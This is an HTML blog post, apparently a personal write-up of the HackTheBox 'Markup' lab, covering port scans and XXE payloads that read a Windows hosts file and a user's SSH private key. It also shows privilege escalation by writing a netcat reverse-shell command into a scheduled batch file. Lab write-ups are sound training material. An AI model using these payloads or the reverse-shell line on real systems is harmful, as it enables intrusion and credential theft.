@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en-gb"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackTheBox - Markup Writeup | SH∆FIQ ∆IM∆N</title>
+<meta property="og:title" content="HackTheBox - Markup Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="twitter:title" content="HackTheBox - Markup Writeup | SH∆FIQ ∆IM∆N" />
+<meta itemprop="name" content="HackTheBox - Markup Writeup | SH∆FIQ ∆IM∆N" />
+<meta name="application-name" content="HackTheBox - Markup Writeup | SH∆FIQ ∆IM∆N" />
+<meta property="og:site_name" content="SH∆FIQ ∆IM∆N" />
+
+<meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
+<meta itemprop="description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support" />
+<meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support" />
+
+<meta property="og:locale" content="en-gb" />
+<meta name="language" content="en-gb" />
+
+
+
+  <meta itemprop="image" content="http://example.com" />
+  <meta property="og:image" content="http://example.com" />
+  <meta name="twitter:image" content="http://example.com" />
+  <meta name="twitter:image:src" content="http://example.com" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2021-08-06T00:00:00Z />
+    <meta property="article:published_time" content=2021-08-06T00:00:00Z />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackTheBox - Markup Writeup",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2021-08-06",
+        "description": "",
+        "wordCount":  688 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2021-08-06",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "SH∆FIQ ∆IM∆N"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.119.0">
+
+    
+
+    <link rel="canonical" href="http://example.com/posts/htb/markup/">
+    <link href="/style.min.b7e4bda148ee8a6b6e7d052cb6d77374a2dca955a40352c3ccf576dc5f33af2c.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://example.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://example.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/tags/">
+                        Tags
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/search/">
+                        Search
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackTheBox - Markup Writeup</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2021-08-06T00:00:00&#43;00:00" itemprop="datePublished"> 6 Aug 2021 </time>
+                </div>
+                
+            </header>
+                <details class="toc">
+                    <summary><b>Table of Contents</b></summary>
+                    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#webpage">Webpage</a></li>
+        <li><a href="#order">Order</a></li>
+        <li><a href="#burpsuite">Burpsuite</a></li>
+      </ul>
+    </li>
+    <li><a href="#xxe-xml-external-entity-injection">XXE [XML External Entity Injection]</a>
+      <ul>
+        <li><a href="#new-entity">New Entity</a></li>
+        <li><a href="#read-file">Read File</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#user-flag">User Flag</a></li>
+        <li><a href="#log-management">Log-Management</a></li>
+        <li><a href="#checking-file-permission">Checking File Permission</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#ncexe">nc.exe</a></li>
+        <li><a href="#admin-flag">Admin Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+                </details>
+                <div class="page-content">
+                <h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>Top 1000 ports scan</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">initial</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">49</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="nmap_1000.png" alt="1"></p>
+<ul>
+<li>All ports scan</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sC</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="o">-</span><span class="w"> </span><span class="o">-</span><span class="k">oN</span><span class="w"> </span><span class="n">nmap</span><span class="o">/</span><span class="n">all_ports</span><span class="w"> </span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">49</span><span class="w">
+</span></span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="nmap_all_ports.png" alt="1"></p>
+<h3 id="open-ports">Open Ports</h3>
+<ul>
+<li>Well, both the Nmap scan result are the same
+<ul>
+<li>port 22/SSH</li>
+<li>port 80/HTTP</li>
+<li>port 443/HTTPs</li>
+</ul>
+</li>
+</ul>
+<h3 id="webpage">Webpage</h3>
+<ul>
+<li>Let&rsquo;s take a look at the webpage <code>HTTP</code></li>
+</ul>
+<p><img src="login.png" alt="1"></p>
+<ul>
+<li>Look&rsquo;s like just a regular login page.</li>
+<li>We can try to login with <code>credentials</code> we&rsquo;ve found from the <code>previous box</code> called <code>Included</code></li>
+<li>Let&rsquo;s try it</li>
+</ul>
+<p><img src="home.png" alt="1"></p>
+<ul>
+<li>Success</li>
+<li>Now, time to <code>enumerate/play around</code> with this page.</li>
+</ul>
+<h3 id="order">Order</h3>
+<ul>
+<li>Well, I found out. We can order something on the <code>order page</code></li>
+<li>Let&rsquo;s try ordering something</li>
+<li>the result</li>
+</ul>
+<p><img src="order.png" alt="1"></p>
+<ul>
+<li>Every time a user orders something it&rsquo;s always <code>pop up this message</code>.</li>
+<li>Let&rsquo;s try check <code>how this form handle the request</code></li>
+</ul>
+<h3 id="burpsuite">Burpsuite</h3>
+<ul>
+<li>I&rsquo;m gonna <code>intercept</code> the request by using <code>burpsuite</code></li>
+<li>Then, send the request into <code>repeater tab</code></li>
+<li>I found this body kinda weird at first.</li>
+<li>It&rsquo;s <code>doesn't look</code> like any <code>JSON</code> data</li>
+</ul>
+<p><img src="xml.png" alt="1"></p>
+<ul>
+<li>Then, I realize this is <code>XML [Extensible Markup Language]</code></li>
+<li>Well, I heard something about <code>XML injection</code> before</li>
+<li>Let&rsquo;s try it</li>
+</ul>
+<h2 id="xxe-xml-external-entity-injection">XXE [XML External Entity Injection]</h2>
+<blockquote>
+<p>An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser.
+Wikipedia - <a href="https://en.wikipedia.org/wiki/XML_external_entity_attack">XML external entity attack</a></p>
+</blockquote>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://www.youtube.com/watch?v=gjm6VHZa_8s">[YouTube]PwnFunction - XML External Entities (Explained)</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks">HackTricks - Xml External Entity</a></li>
+<li><a href="https://portswigger.net/web-security/xxe">Portswigger - XXE</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="new-entity">New Entity</h3>
+<ul>
+<li>I&rsquo;m going to test if a simple <code>new ENTITY declaration</code> is working</li>
+<li>here&rsquo;s what the payload gonna looks like.</li>
+<li>Source
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks">HackTricks - Xml External Entity</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example &#34;test&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;productId&gt;</span><span class="ni">&amp;example;</span><span class="nt">&lt;/productId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="XML-test.png" alt="1"></p>
+<ul>
+<li>it is working</li>
+</ul>
+<h3 id="read-file">Read File</h3>
+<ul>
+<li>Now, Let&rsquo;s try to <code>read a file with it</code></li>
+<li>So, I&rsquo;m gonna insert this command</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;file:///c:/windows/system32/drivers/etc/hosts&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;order&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;quantity&gt;</span>
+</span></span><span class="line"><span class="cl">       1
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/quantity&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;item&gt;</span>
+</span></span><span class="line"><span class="cl">       <span class="ni">&amp;example;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/item&gt;</span>
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;address&gt;</span>
+</span></span><span class="line"><span class="cl">       Bed for sleeping of course
+</span></span><span class="line"><span class="cl">   <span class="nt">&lt;/address&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/order&gt;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="host.png" alt="1"></p>
+<ul>
+<li>Wow! It works</li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<ul>
+<li>Remember this machine has <code>SSH open</code>.</li>
+<li>Let&rsquo;s try to read the <code>SSH private key</code></li>
+<li>Windows SSH key locate here: <code>C:\Users\USERNAME\.ssh\</code></li>
+</ul>
+<h3 id="ssh">SSH</h3>
+<ul>
+<li>I&rsquo;m gonna put this as a payload</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;file:///c:/users/daniel/.ssh/id_rsa&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;order&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;quantity&gt;</span>
+</span></span><span class="line"><span class="cl">        1
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/quantity&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="ni">&amp;example;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/item&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;address&gt;</span>
+</span></span><span class="line"><span class="cl">        Bed for sleeping of course
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/address&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/order&gt;</span>
+</span></span></code></pre></div><ul>
+<li>the result</li>
+</ul>
+<p><img src="ssh-prikey.png" alt="1"></p>
+<ul>
+<li>WOW! we&rsquo;ve got the private key</li>
+<li>Let&rsquo;s copy it and try login with SSH</li>
+</ul>
+<blockquote>
+<p>Before we can log in. Make sure to change the permission of the key with the command
+<code>chmod 600 &lt;filename&gt;</code></p>
+</blockquote>
+<ul>
+<li>Now, Let&rsquo;s try login with this command</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i &lt;filename&gt; daniel@10.10.10.49
+</span></span></code></pre></div><p><img src="ssh.png" alt="1"></p>
+<ul>
+<li>I&rsquo;m in</li>
+</ul>
+<h3 id="user-flag">User Flag</h3>
+<p><img src="user.png" alt="1"></p>
+<h3 id="log-management">Log-Management</h3>
+<ul>
+<li>Let&rsquo;s start to enumerate this machine</li>
+<li>I found kinda <code>sus</code> folder in the root directory
+<ul>
+<li><em><font color="yellow">maybe I don&rsquo;t know it&rsquo;s actually exists</font></em></li>
+</ul>
+</li>
+</ul>
+<p><img src="log-manage.png" alt="1"></p>
+<ul>
+<li>The folder called <code>Log-Management</code></li>
+<li>Found the file name <code>job.bat</code> and see the content of that file</li>
+</ul>
+<p><img src="job.png" alt="1"></p>
+<ul>
+<li>So, I&rsquo;m gonna assume this script for <code>clearing event log</code> and gonna <code>run automatically like UNIX cronjob</code></li>
+<li><code>¯\__(ツ)_/¯</code></li>
+</ul>
+<h3 id="checking-file-permission">Checking File Permission</h3>
+<ul>
+<li>
+<p>We can abuse this if we had the permission to change the content of the file</p>
+</li>
+<li>
+<p>Source</p>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil">Microsoft - wevutils</a></li>
+<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls">Microsoft - icacls</a></li>
+<li><a href="https://superuser.com/questions/364083/windows-list-files-and-their-permissions-access-in-command-line">superuser - windows list file permission</a></li>
+<li><a href="https://www.geeksforgeeks.org/basics-of-batch-scripting/">GeeksforGeeks - basic of batch scripting</a></li>
+</ul>
+</li>
+<li>
+<p>I&rsquo;m going to run this command</p>
+</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">icacls job.txt
+</span></span></code></pre></div><p><img src="icacls.png" alt="1"></p>
+<ul>
+<li>we&rsquo;ve got <code>full access</code> to that file</li>
+<li>remember we&rsquo;re still <code>daniel</code></li>
+<li>Let&rsquo;s get the shell</li>
+</ul>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="ncexe">nc.exe</h3>
+<ul>
+<li>Let&rsquo;s get the <code>reverse shell</code>.</li>
+<li>First, we need to upload <code>nc.exe</code> into the machine</li>
+</ul>
+<blockquote>
+<p><font color="yellow">Windows do not come with nc installed. So, we need to upload it</font></p>
+</blockquote>
+<p><img src="awang_2.png" alt="1"></p>
+<ul>
+<li>First, let&rsquo;s start our <code>nc for listening to the connection</code></li>
+<li>Then, put this payload in <code>job.bat</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">c:</span><span class="p">\</span><span class="nb">log-management</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="py">exe</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="py">43</span> <span class="mf">9901</span>
+</span></span></code></pre></div><p><img src="tulis.png" alt="1"></p>
+<ul>
+<li>the result</li>
+<li>we&rsquo;ve got the <code>shell</code> and own the box</li>
+</ul>
+<p><img src="yes.png" alt="1"></p>
+<h3 id="admin-flag">Admin Flag</h3>
+<p><img src="root.png" alt="1"></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I&rsquo;ve learned a lot today. The XXE is so cool and it also can be dangerous if the input is not properly configured. Talk about &ldquo;configure&rdquo;. The file admin can run also need to configure properly in this case file called job.bat. Once again, don&rsquo;t use the same password.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/hugo-sid" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://twitter.com" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2023 shafiqaiman.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+    
+    
+        
+    
+
+    
+    
+        
+    
+
+
+
+    
+    <script src="http://example.com/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
